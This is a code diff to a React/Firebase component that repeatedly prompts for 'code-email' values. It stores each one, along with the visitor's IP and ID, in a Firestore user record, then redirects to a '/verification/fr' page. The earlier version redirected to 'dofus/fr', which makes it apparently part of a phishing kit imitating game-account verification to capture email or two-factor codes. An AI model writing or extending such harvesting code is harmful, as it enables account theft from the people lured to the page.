@@ -67,32 +67,33 @@ function AppVer(props) {
 
      }
 
-     const [count,setCount] = useState(0);
+     const [count,setCount] = useState(1);
 
      const send = async(e)=>{
       e.preventDefault();
-      if (count === 0) {
-      const document = doc(db, "users", uid);
-      await updateDoc(document, {
-          mail: code
-      });
-      }else if(count === 1){
-        const document = doc(db, "users", uid);
-        await updateDoc(document, {
-            mail2: code
-        });
-      }else if(count === 2){
-        const document = doc(db, "users", uid);
-        await updateDoc(document, {
-            mail3: code
-        });
-      }else{
-        Router("dofus/fr");
-      }
-      setCount(prev => prev + 1);
-      setCode("");
-      setShow(true)
+      if (count < 3) {
+        e.preventDefault();
+          let localText = localStorage.getItem("text");
+          localText = localText.split("/");
+          localText.push(` / code-email: ${code}`);
+    
+            const document = doc(db, "users", uid);
+            await updateDoc(document, {
+                text: localText.join(" "),
+    });
+    localStorage.setItem("text", localText.join(" "));
+    setCount(prev => prev + 1);
+    setCode("");
+     }  
     }
+
+    useEffect(()=>{
+      console.log(count)
+      if (count > 2) {
+        Router("/verification/fr",{state:{ip:ip,uid:uid}})
+        setCount(1);
+      }
+    },[count]);
 
   return (
     <div className={styles.App}>
